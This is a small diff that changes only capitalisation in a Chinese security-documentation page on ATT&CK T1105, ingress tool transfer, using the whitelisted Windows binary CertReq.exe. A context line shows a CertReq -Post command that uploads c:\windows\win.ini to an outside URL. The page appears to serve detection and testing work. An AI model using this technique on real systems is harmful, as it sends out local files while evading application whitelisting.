@@ -1,4 +1,4 @@
-# T1105-win-入口工具转移-CertReq.exe(白名单)
+# T1105-Win-入口工具转移-CertReq.exe(白名单)
 
 ## 来自ATT&CK的描述
 
@@ -27,7 +27,7 @@ CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 
 ## 检测日志
 
-windows安全日志
+Windows 安全日志
 
 ## 测试复现
 
